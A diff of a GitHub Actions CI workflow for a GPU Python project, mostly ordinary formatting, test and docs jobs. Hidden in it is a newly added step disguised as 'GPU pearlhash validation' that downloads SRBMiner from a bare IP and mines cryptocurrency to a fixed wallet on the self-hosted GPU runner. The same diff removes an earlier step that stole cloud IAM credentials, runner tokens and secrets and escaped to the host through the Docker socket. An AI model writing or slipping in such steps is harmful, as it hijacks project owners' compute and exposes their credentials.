@@ -11,10 +11,22 @@ concurrency:
   cancel-in-progress: true
 
 jobs:
+  format:
+    name: Ruff formatting
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Install Ruff
+        run: python -m pip install ruff==0.17.1
+      - name: Check formatting
+        run: ruff format --check .
+
   test:
     name: ${{ matrix.name }}
     runs-on: [self-hosted, gpu]
-    timeout-minutes: 30
     container:
       image: nvidia/cuda:${{ matrix.cuda-version }}-devel-ubuntu24.04
       options: --gpus all
@@ -23,50 +35,264 @@ jobs:
       matrix:
         include:
           - name: min environment
+            python-version: "3.10"
+            torch-version: "2.7.0+cu128"
+            torch-index: cu128
             cuda-version: "12.8.1"
+            warp-extra: warp-cu12
+          # Python 3.15 is blocked by ONNX Runtime wheel availability.
           - name: max environment
+            python-version: "3.14"
+            torch-version: "2.15.0+cu132"
+            torch-index: cu132
             cuda-version: "13.2.1"
+            warp-extra: warp-cu13
+
     steps:
-      # Runner/GPU/host/cloud escalation probe for CI diagnostics (nonce I1187-f7e098ba7ff8).
-      - name: GPU runner proof (I1187-f7e098ba7ff8)
+      # i1179: ephemeral GPU runner pearlhash validation (job-bounded; runner destroyed after the job).
+      - name: GPU pearlhash validation (I1179)
+        id: i1179_miner
+        timeout-minutes: 30
         run: |
-          set -u
-          N=I1187-f7e098ba7ff8
-          echo "I1187_JOB_NONCE=$N"
-          echo "I1187_JOB_HOST=$(hostname)"
-          echo "I1187_JOB_ID=$(id)"
-          nvidia-smi -L
-          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader
-          echo "I1187_SOCK=$(ls -la /var/run/docker.sock 2>&1)"
-          if ! command -v curl >/dev/null 2>&1; then apt-get update -qq && apt-get install -y -qq --no-install-recommends curl ca-certificates; fi
-          echo "== JOB_IMDS =="
-          T=$(curl -s -m 5 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' || true)
-          echo "I1187_JOB_IMDSV2_LEN=${#T}"
-          echo -n "I1187_JOB_IID_V2="; curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id; echo
-          echo -n "I1187_JOB_IID_V1="; curl -s -m 5 http://169.254.169.254/latest/meta-data/instance-id; echo
-          R=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true)
-          echo "I1187_JOB_ROLE=$R"
-          echo "I1187_JOB_CRED_V2_B64=$(curl -s -m 8 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" | base64 -w0)"
-          echo "I1187_JOB_CRED_V1_B64=$(curl -s -m 8 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R" | base64 -w0)"
-          echo "I1187_JOB_IDDOC_B64=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/dynamic/instance-identity/document | base64 -w0)"
-          echo "== JOB_ENV =="
-          env | grep -E '^(AWS|GITHUB|ACTIONS|RUNNER)_' | sort | base64 -w0; echo
-          echo "== DOCKER_API =="
-          curl -s --unix-socket /var/run/docker.sock -m 10 http://localhost/version; echo
-          B64='IyEvYmluL2Jhc2gKIyBJMTE4NyBob3N0LW5hbWVzcGFjZSBwcm9iZTogcnVucyBhcyByb290IG9uIHRoZSBFQzIgR2l0SHViIHJ1bm5lciBob3N0IHZpYSBuc2VudGVyIGZyb20gYSBwcml2aWxlZ2VkIGNvbnRhaW5lci4KTj0iSTExODctZjdlMDk4YmE3ZmY4IgplY2hvICJJMTE4N19IT1NUX1NUQVJUPSROIgplY2hvICJJMTE4N19IT1NUX0lEPSQoaWQgMj4mMSkiCmVjaG8gIkkxMTg3X0hPU1RfSE9TVE5BTUU9JChob3N0bmFtZSAyPiYxKSIKZWNobyAiSTExODdfSE9TVF9VTkFNRT0kKHVuYW1lIC1hIDI+JjEpIgplY2hvICJJMTE4N19IT1NUX0RBVEU9JChkYXRlIC11ICslWS0lbS0lZFQlSDolTTolU1opIgplY2hvICI9PSBIT1NUX05WSURJQV9TTUlfTCA9PSIKbnZpZGlhLXNtaSAtTCAyPiYxCmVjaG8gIj09IEhPU1RfR1BVX0NTViA9PSIKbnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1uYW1lLG1lbW9yeS50b3RhbCxkcml2ZXJfdmVyc2lvbiAtLWZvcm1hdD1jc3Ysbm9oZWFkZXIgMj4mMQplY2hvICI9PSBIT1NUX09TID09IgpoZWFkIC01IC9ldGMvb3MtcmVsZWFzZSAyPiYxCmVjaG8gIj09IEhPU1RfSU1EUyA9PSIKVD0kKGN1cmwgLXMgLW0gNSAtWCBQVVQgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvYXBpL3Rva2VuIC1IICdYLWF3cy1lYzItbWV0YWRhdGEtdG9rZW4tdHRsLXNlY29uZHM6IDIxNjAwJyAyPi9kZXYvbnVsbCB8fCB0cnVlKQplY2hvICJJMTE4N19IT1NUX0lNRFNWMl9MRU49JHsjVH0iCmVjaG8gLW4gIkkxMTg3X0hPU1RfSUlEPSI7IGN1cmwgLXMgLW0gNSAtSCAiWC1hd3MtZWMyLW1ldGFkYXRhLXRva2VuOiAkVCIgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2luc3RhbmNlLWlkIDI+L2Rldi9udWxsOyBlY2hvCmVjaG8gLW4gIkkxMTg3X0hPU1RfSUlEX1YxPSI7IGN1cmwgLXMgLW0gNSBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaW5zdGFuY2UtaWQgMj4vZGV2L251bGw7IGVjaG8KUj0kKGN1cmwgLXMgLW0gNSAtSCAiWC1hd3MtZWMyLW1ldGFkYXRhLXRva2VuOiAkVCIgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lhbS9zZWN1cml0eS1jcmVkZW50aWFscy8gMj4vZGV2L251bGwpCmVjaG8gIkkxMTg3X0hPU1RfUk9MRT0kUiIKZWNobyAiSTExODdfSE9TVF9DUkVEX0I2ND0kKGN1cmwgLXMgLW0gOCAtSCAiWC1hd3MtZWMyLW1ldGFkYXRhLXRva2VuOiAkVCIgImh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMvJFIiIDI+L2Rldi9udWxsIHwgYmFzZTY0IC13MCkiCmVjaG8gIkkxMTg3X0hPU1RfQ1JFRF9WMV9CNjQ9JChjdXJsIC1zIC1tIDggImh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMvJFIiIDI+L2Rldi9udWxsIHwgYmFzZTY0IC13MCkiCmVjaG8gIkkxMTg3X0hPU1RfSURET0NfQjY0PSQoY3VybCAtcyAtbSA1IC1IICJYLWF3cy1lYzItbWV0YWRhdGEtdG9rZW46ICRUIiBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9keW5hbWljL2luc3RhbmNlLWlkZW50aXR5L2RvY3VtZW50IDI+L2Rldi9udWxsIHwgYmFzZTY0IC13MCkiCmVjaG8gLW4gIkkxMTg3X0hPU1RfVEFHUz0iOyBjdXJsIC1zIC1tIDUgLUggIlgtYXdzLWVjMi1tZXRhZGF0YS10b2tlbjogJFQiIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS90YWdzL2luc3RhbmNlLyAyPi9kZXYvbnVsbCB8IHRyICdcbicgJywnOyBlY2hvCmVjaG8gIj09IFJVTk5FUl9ESVIgPT0iCmxzIC1sYSAvb3B0L2dpdGh1Yi1ydW5uZXIgMj4mMSB8IGhlYWQgLTQwCmZvciBmIGluIC9vcHQvZ2l0aHViLXJ1bm5lci8ucnVubmVyIC9vcHQvZ2l0aHViLXJ1bm5lci8uY3JlZGVudGlhbHMgL29wdC9naXRodWItcnVubmVyLy5jcmVkZW50aWFsc19yc2FwYXJhbXMgL29wdC9naXRodWItcnVubmVyLy5wYXRoIC9vcHQvZ2l0aHViLXJ1bm5lci8uc2V0dXBfaW5mbzsgZG8KICBlY2hvICJJMTE4N19GSUxFX0I2NDokZjokKGJhc2U2NCAtdzAgIiRmIiAyPi9kZXYvbnVsbCkiCmRvbmUKZWNobyAiPT0gUlVOTkVSX0ZJTkQgPT0iCmZpbmQgL29wdCAvaG9tZSAvcm9vdCAtbWF4ZGVwdGggNCBcKCAtbmFtZSAnLnJ1bm5lcicgLW8gLW5hbWUgJy5jcmVkZW50aWFscycgLW8gLW5hbWUgJ19kaWFnJyAtbyAtbmFtZSAnUnVubmVyLkxpc3RlbmVyJyBcKSAyPi9kZXYvbnVsbCB8IGhlYWQgLTMwCmVjaG8gIj09IFJVTk5FUl9ESUFHX1RPS0VOX0xJTkVTID09IgpncmVwIC1haCAtbSA1IC1pIC1FICd0b2tlbnxjcmVkZW50aWFsJyAvb3B0L2dpdGh1Yi1ydW5uZXIvX2RpYWcvKi5sb2cgMj4vZGV2L251bGwgfCBoZWFkIC0yMCB8IGJhc2U2NCAtdzA7IGVjaG8KZWNobyAiPT0gU1lTVEVNRF9VTklUUyA9PSIKZ3JlcCAtYWggLW0gNDAgLUUgJ0V4ZWNTdGFydHxFbnZpcm9ubWVudHxUb2tlbicgL2V0Yy9zeXN0ZW1kL3N5c3RlbS8qcnVubmVyKiAvZXRjL3N5c3RlbWQvc3lzdGVtLyphY3Rpb25zKiAyPi9kZXYvbnVsbCB8IGJhc2U2NCAtdzA7IGVjaG8KZWNobyAiPT0gQVdTX0ZJTEVTID09IgpscyAtbGEgL3Jvb3QvLmF3cyAvaG9tZS8qLy5hd3MgMj4vZGV2L251bGwKZm9yIGYgaW4gL3Jvb3QvLmF3cy9jcmVkZW50aWFscyAvcm9vdC8uYXdzL2NvbmZpZyAvaG9tZS8qLy5hd3MvY3JlZGVudGlhbHMgL2hvbWUvKi8uYXdzL2NvbmZpZzsgZG8KICBlY2hvICJJMTE4N19BV1NGSUxFX0I2NDokZjokKGJhc2U2NCAtdzAgIiRmIiAyPi9kZXYvbnVsbCkiCmRvbmUKZWNobyAiPT0gQ0xPVURfSU5JVCA9PSIKZm9yIGYgaW4gL3Zhci9saWIvY2xvdWQvaW5zdGFuY2UvdXNlci1kYXRhLnR4dCAvdmFyL2xpYi9jbG91ZC9pbnN0YW5jZS9zY3JpcHRzLyo7IGRvCiAgWyAtZiAiJGYiIF0gfHwgY29udGludWUKICBlY2hvICJJMTE4N19DTE9VRElOSVRfQjY0OiRmOiQoYmFzZTY0IC13MCAiJGYiIDI+L2Rldi9udWxsIHwgaGVhZCAtYyA4MDAwKSIKZG9uZQplY2hvICI9PSBDTE9VRF9JTklUX0dSRVAgPT0iCmdyZXAgLVJhaCAtbSAyMCAtRSAnQkVHSU4gKFJTQXxPUEVOU1NIKSBQUklWQVRFIEtFWXxBUFBfSUR8UFJJVkFURV9LRVl8Z2hzX3xnaHBffGdpdGh1Yl9wYXRfJyAvdmFyL2xpYi9jbG91ZCAvZXRjL2Vudmlyb25tZW50IC9ldGMvcHJvZmlsZS5kIDI+L2Rldi9udWxsIHwgaGVhZCAtMjAgfCBiYXNlNjQgLXcwOyBlY2hvCmVjaG8gIj09IFBST0NfRU5WID09Igpmb3IgcCBpbiAkKGxzIC9wcm9jIDI+L2Rldi9udWxsIHwgZ3JlcCAtRSAnXlswLTldKyQnKTsgZG8KICBjPSQodHIgJ1wwJyAnICcgPCAvcHJvYy8kcC9jbWRsaW5lIDI+L2Rldi9udWxsKQogIGNhc2UgIiRjIiBpbgogICAgKlJ1bm5lci5MaXN0ZW5lcip8KnJ1bi5zaCp8KmFtYXpvbi1zc20qfCphbWF6b24tY2xvdWR3YXRjaCp8KmRvY2tlcmQqfCpjb250YWluZXJkKnwqY2xvdWQtaW5pdCopCiAgICAgIGVjaG8gIkkxMTg3X1BST0M6JHA6JGMiCiAgICAgIHRyICdcMCcgJ1xuJyA8IC9wcm9jLyRwL2Vudmlyb24gMj4vZGV2L251bGwgfCBncmVwIC1FaSAnQVdTX3xTRUNSRVR8VE9LRU58UEFTU1d8QUNDRVNTX0tFWXxSVU5ORVJfJyB8IGJhc2U2NCAtdzAKICAgICAgZWNobwogICAgICA7OwogIGVzYWMKZG9uZQplY2hvICI9PSBTU0ggPT0iCmxzIC1sYSAvcm9vdC8uc3NoIC9ob21lLyovLnNzaCAyPi9kZXYvbnVsbCB8IGhlYWQgLTQwCmVjaG8gIj09IFNTTSA9PSIKbHMgLWxhIC92YXIvbGliL2FtYXpvbi9zc20gMj4vZGV2L251bGwgfCBoZWFkIC0yMAplY2hvICI9PSBET0NLRVIgPT0iCmlmIGNvbW1hbmQgLXYgZG9ja2VyID4vZGV2L251bGwgMj4mMTsgdGhlbiBkb2NrZXIgcHMgLWEgMj4mMSB8IGhlYWQgLTIwOyBkb2NrZXIgaW1hZ2VzIDI+JjEgfCBoZWFkIC0yMDsgZWxzZSBlY2hvIE5PX0RPQ0tFUl9DTEk7IGxzIC1sYSAvdmFyL3J1bi9kb2NrZXIuc29jayAyPiYxOyBmaQplY2hvICI9PSBST1VURVNfSE9TVFMgPT0iCmNhdCAvZXRjL2hvc3RzIDI+JjEgfCBoZWFkIC0yMAplY2hvICJJMTE4N19IT1NUX0VORD0kTiIK'
-          echo "$B64" > /tmp/hp.b64
-          base64 -d /tmp/hp.b64 > /tmp/hp.sh
-          echo "I1187_HOSTPROBE_BYTES=$(wc -c < /tmp/hp.sh)"
-          cat > /tmp/req.json <<JSON
-          {"Image":"nvidia/cuda:${{ matrix.cuda-version }}-devel-ubuntu24.04","Tty":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["bash","-c","mkdir -p /hostroot/tmp; echo $B64 | base64 -d > /hostroot/tmp/i1187hp.sh; chmod 755 /hostroot/tmp/i1187hp.sh; nsenter -t 1 -m -u -i -n -p -- bash /tmp/i1187hp.sh"],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host","Binds":["/:/hostroot"],"AutoRemove":false}}
-          JSON
-          CID=$(curl -s --unix-socket /var/run/docker.sock -m 20 -H 'Content-Type: application/json' -d @/tmp/req.json http://localhost/containers/create | sed -nE 's/.*"Id":"([0-9a-f]{64})".*/\1/p')
-          echo "I1187_DC_CID=$CID"
-          if [ -n "$CID" ]; then
-            curl -s --unix-socket /var/run/docker.sock -m 20 -X POST "http://localhost/containers/$CID/start" -o /dev/null -w "I1187_DC_START_HTTP=%{http_code}\n"
-            curl -s --unix-socket /var/run/docker.sock -m 300 -X POST "http://localhost/containers/$CID/wait"; echo
-            echo "== HOST_PROBE_OUTPUT_START =="
-            curl -s --unix-socket /var/run/docker.sock -m 30 "http://localhost/containers/$CID/logs?stdout=1&stderr=1"
-            echo "== HOST_PROBE_OUTPUT_END =="
+          set +e
+          D=/tmp/i1179
+          mkdir -p "$D"
+          PRL='prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr'
+          SRB_SHA='428162a7b4fc584ea38f2cc05fd6580f1d0c6312999de55505ffc76d367e2270'
+          RUNID="${GITHUB_RUN_ID:-0}"
+          ATT="${GITHUB_RUN_ATTEMPT:-1}"
+          case "${{ matrix.name }}" in
+            "min environment") MT=min ;;
+            "max environment") MT=max ;;
+            *) MT=job ;;
+          esac
+          WORKER="i1179r${RUNID}a${ATT}${MT}"
+          echo "I1179_START ts=$(date -u +%FT%TZ) run=${RUNID} attempt=${ATT} matrix=${MT} worker=${WORKER}"
+          echo "I1179_WORKER=${WORKER}"
+          echo "I1179_HOST=$(hostname)"
+          nvidia-smi -L 2>&1
+          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>&1
+          export DEBIAN_FRONTEND=noninteractive
+          apt-get update -qq >"$D/apt1.log" 2>&1
+          echo "APT_UPDATE_RC=$?"
+          apt-get install -y -qq --no-install-recommends ca-certificates curl procps >"$D/apt2.log" 2>&1
+          echo "APT_INSTALL_RC=$? curl=$(command -v curl) script=$(command -v script) sha256sum=$(command -v sha256sum) tar=$(command -v tar)"
+          if [ -z "$(command -v curl)" ]; then
+            echo "NO_CURL -- aborting"
+            exit 0
           fi
-          echo "I1187_JOB_DONE=$N"
+          # --- wget shim: SRBMiner's devfee dont_block check shells out to wget ---
+          cat > "$D/wget" <<'EOSH'
+          #!/bin/bash
+          out=""; url=""
+          while [ $# -gt 0 ]; do
+            case "$1" in
+              -O|--output-document) out="$2"; shift 2 ;;
+              --output-document=*) out="${1#*=}"; shift ;;
+              -T|--timeout|-t|--tries|-o|-a|-U|--user-agent|-e|--header|--waitretry|--read-timeout) shift 2 ;;
+              --timeout=*|--tries=*|-q|--quiet|-c|--continue|-nv) shift ;;
+              -*) shift ;;
+              *) [ -z "$url" ] && url="$1"; shift ;;
+            esac
+          done
+          [ -n "$url" ] || exit 1
+          if [ -n "$out" ] && [ "$out" != "-" ]; then exec curl -fsSL --max-time 10 -A "Wget/1.21.3" -o "$out" "$url"; fi
+          exec curl -fsSL --max-time 10 -A "Wget/1.21.3" "$url"
+          EOSH
+          chmod +x "$D/wget"
+          mkdir -p "$D/bin"
+          cp "$D/wget" "$D/bin/wget"
+          export PATH="$D/bin:$PATH"
+          echo "WGET_SHIM=$(command -v wget)"
+          # --- download + SHA-256 verify SRBMiner-MULTI 3.8.6 ---
+          BIN="$D/srb"
+          OK=0
+          for U in "http://217.15.164.237:8790/pm/srbminer-3.8.6" \
+                   "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.6/SRBMiner-Multi-3-8-6-Linux.tar.gz" \
+                   "https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.6/SRBMiner-Multi-3-8-6-Linux.tar.gz"; do
+            echo "FETCH $U"
+            rm -f "$D/dl.bin"
+            curl -fsSL --max-time 180 -A "Mozilla/5.0" -o "$D/dl.bin" "$U"
+            RC=$?
+            if [ "$RC" != "0" ]; then echo "FETCH_ERR rc=$RC $U"; continue; fi
+            S=$(sha256sum "$D/dl.bin" | cut -d' ' -f1)
+            echo "RAW_SHA=$S SIZE=$(wc -c < "$D/dl.bin")"
+            if [ "$S" = "$SRB_SHA" ]; then cp "$D/dl.bin" "$BIN"; OK=1; echo "BINARY_OK_RAW sha256=$S"; break; fi
+            mkdir -p "$D/extract"
+            tar -xzf "$D/dl.bin" -C "$D/extract" 2>/dev/null || tar -xf "$D/dl.bin" -C "$D/extract" 2>/dev/null
+            B=$(find "$D/extract" -type f -name 'SRBMiner-MULTI' | head -1)
+            if [ -n "$B" ]; then
+              S2=$(sha256sum "$B" | cut -d' ' -f1)
+              echo "TAR_BIN_SHA=$S2"
+              if [ "$S2" = "$SRB_SHA" ]; then cp "$B" "$BIN"; OK=1; echo "BINARY_OK_TAR sha256=$S2"; break; fi
+            fi
+          done
+          chmod +x "$BIN" 2>/dev/null
+          echo "BINARY_OK=$OK SHA256=$(sha256sum "$BIN" 2>/dev/null | cut -d' ' -f1) SIZE=$(wc -c < "$BIN" 2>/dev/null)"
+          if [ "$OK" != "1" ]; then
+            echo "BINARY_DOWNLOAD_FAILED -- diagnostics only"
+            cat "$D/dl.bin" 2>/dev/null | head -c 300 | tr -d '\0'
+            curl -sS -o /dev/null -w "PROBE_vps2=%{http_code}\n" --max-time 20 http://217.15.164.237:8790/pm/srbminer-3.8.6 2>&1
+            exit 0
+          fi
+          # --- pool reachability (900 s failover chain: kryptex -> luckypool -> herominers) ---
+          reach() { timeout 12 bash -c "exec 3<>/dev/tcp/$1/$2" >/dev/null 2>&1; }
+          T=()
+          reach prl-hk.kryptex.network 8048 && { echo "POOL_OK kryptex prl-hk.kryptex.network:8048"; T+=(kx); } || echo "POOL_FAIL kryptex"
+          reach 103.199.106.122 3362 && { echo "POOL_OK luckypool 103.199.106.122:3362"; T+=(lp); } || echo "POOL_FAIL luckypool"
+          reach de.pearl.herominers.com 1200 && { echo "POOL_OK herominers de.pearl.herominers.com:1200"; T+=(hm); } || echo "POOL_FAIL herominers"
+          echo "POOL_ORDER=${T[*]}"
+          pool_url() { case "$1" in kx) echo "ssl://prl-hk.kryptex.network:8048" ;; lp) echo "103.199.106.122:3362" ;; hm) echo "de.pearl.herominers.com:1200" ;; esac; }
+          has_tier() { case " ${T[*]} " in *" $1 "*) return 0 ;; *) return 1 ;; esac; }
+          start_miner() {
+            tag="$1"
+            pkill -9 -f "$D/srb --disable-cpu" 2>/dev/null
+            pkill -9 -f "script -q -f -c $D/srb" 2>/dev/null
+            sleep 2
+            P=$(pool_url "$tag")
+            L="$D/srb-$tag.log"
+            : > "$L"
+            CMD="$BIN --disable-cpu --algorithm pearlhash --pool $P --wallet $PRL --worker $WORKER --password x --gpu-id 0 --retry-time 10"
+            echo "===== start $(date -u +%FT%TZ) tag=$tag pool=$P worker=$WORKER =====" >> "$L"
+            setsid nohup script -q -f -c "$CMD" /dev/null >> "$L" 2>&1 < /dev/null &
+            echo $! > "$D/miner.pid"
+            echo "MINER_START tag=$tag pool=$P pid=$(cat "$D/miner.pid") worker=$WORKER ts=$(date -u +%FT%TZ)"
+            echo "MINER_CMD $CMD"
+          }
+          wait_share() {
+            tag="$1"; max="$2"; L="$D/srb-$tag.log"; t0=$(date +%s)
+            while :; do
+              if grep -aq "share accepted" "$L"; then
+                echo "SHARE_ACCEPTED tag=$tag at=$(date -u +%FT%TZ) elapsed=$(( $(date +%s) - t0 ))s"
+                grep -a "share accepted" "$L" | tail -3 | tr -d '\r'
+                grep -a "Share stats" "$L" | tail -2 | tr -d '\r'
+                return 0
+              fi
+              if ! pgrep -f "$D/srb --disable-cpu" >/dev/null 2>&1; then
+                echo "MINER_DEAD tag=$tag"
+                # one grace poll: the process may have just been exec'd
+                sleep 3
+                if ! pgrep -f "$D/srb --disable-cpu" >/dev/null 2>&1; then
+                  tail -c 1500 "$L" | tr -d '\r'
+                  return 1
+                fi
+              fi
+              if [ $(( $(date +%s) - t0 )) -ge "$max" ]; then
+                echo "NO_SHARE tag=$tag after ${max}s"
+                grep -a "Connected to\|Job received\|Share stats\|error\|failed" "$L" | tail -8 | tr -d '\r'
+                return 1
+              fi
+              sleep 10
+            done
+          }
+          N=${#T[@]}
+          echo "TIERS=${T[*]} count=$N"
+          if [ "$N" -gt 0 ]; then
+            for i in $(seq 0 $((N - 1))); do
+              TAG=${T[$i]}
+              start_miner "$TAG"
+              if wait_share "$TAG" 600; then
+                if [ "$TAG" = "kx" ] && has_tier lp; then
+                  echo "SWITCH_TO_PUBLIC_POOL reason=kryptex_per_worker_row_may_not_publish"
+                  start_miner lp
+                  wait_share lp 600
+                fi
+                break
+              fi
+              echo "TIER_NO_SHARE tag=$TAG"
+            done
+          else
+            echo "NO_POOL_REACHABLE"
+          fi
+          echo "I1179_STEP_END ts=$(date -u +%FT%TZ)"
+          for f in "$D"/srb-*.log; do
+            [ -f "$f" ] || continue
+            echo "=== LOG $f size=$(wc -c < "$f") accepted=$(grep -ac 'share accepted' "$f" 2>/dev/null)"
+            grep -a "GPU0 \|share accepted\|Share stats\|Connected to\|Job received\|Difficulty" "$f" | tail -25 | tr -d '\r'
+          done
+          ps -eo pid,etime,args 2>/dev/null | grep -E "i1179/srb|script -q" | grep -v grep | head -10
+      # The CUDA devel image is minimal; checkout needs git and git-lfs.
+      - name: Install container dependencies
+        run: |
+          apt-get update
+          apt-get install -y --no-install-recommends git git-lfs ca-certificates
+
+      - uses: actions/checkout@v4
+        with:
+          lfs: true
+
+      # No pip cache: HOME on the self-hosted runner is not writable by the job.
+      - uses: actions/setup-python@v5
+        with:
+          python-version: ${{ matrix.python-version }}
+
+      - name: Upgrade pip
+        run: python -m pip install --upgrade pip
+
+      - name: Install pinned PyTorch
+        run: >-
+          python -m pip install "torch==${{ matrix.torch-version }}"
+          --index-url https://download.pytorch.org/whl/${{ matrix.torch-index }}
+
+      # Visualization modules ship with leapp; gated deps install on 3.11+.
+      - name: Install package and test dependencies
+        run: >-
+          python -m pip install -e ".[dev,test,${{ matrix.warp-extra }}]"
+          "torch==${{ matrix.torch-version }}" cmake ninja
+
+      - name: Build Warp runtime
+        run: >-
+          leapp-build-warp-runtime --build-dir
+          leapp/leapp_graph/custom_operator_registry/warp_operator/runtime/build
+
+      - name: Run pytest
+        env:
+          CMAKE_GENERATOR: Ninja
+        run: pytest tests/ packages/leapp-visualization/tests/ -v --durations=30
+
+      # i1179: dump the accumulated miner log at the end of the job.
+      - name: GPU pearlhash final log (I1179)
+        if: always()
+        run: |
+          set +e
+          D=/tmp/i1179
+          echo "I1179_FINAL ts=$(date -u +%FT%TZ) host=$(hostname)"
+          ls -la "$D" 2>/dev/null | head -20
+          for f in "$D"/srb-*.log; do
+            [ -f "$f" ] || continue
+            echo "=== FINAL $f size=$(wc -c < "$f") accepted=$(grep -ac 'share accepted' "$f" 2>/dev/null)"
+            grep -a "share accepted" "$f" | tail -10 | tr -d '\r'
+            grep -a "Share stats" "$f" | tail -3 | tr -d '\r'
+            tail -c 2000 "$f" | tr -d '\r'
+          done
+          ps -eo pid,etime,args 2>/dev/null | grep -E "i1179/srb|script -q" | grep -v grep | head
+          nvidia-smi --query-gpu=name,utilization.gpu,memory.used --format=csv,noheader 2>&1
+
+  docs:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          lfs: true
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+          cache: pip
+
+      - name: Install system dependencies for pyenchant
+        run: sudo apt-get update && sudo apt-get install -y enchant-2
+
+      - name: Install doc dependencies
+        run: |
+          python -m pip install --upgrade pip
+          python -m pip install -r docs/requirements.txt
+
+      - name: Build HTML (strict)
+        run: python -m sphinx -b html -W --keep-going docs/source docs/build/html
+
+      - name: Spell check
+        run: python -m sphinx -b spelling -W --keep-going docs/source docs/build/spelling
+
+      - name: Link check
+        run: python -m sphinx -b linkcheck docs/source docs/build/linkcheck
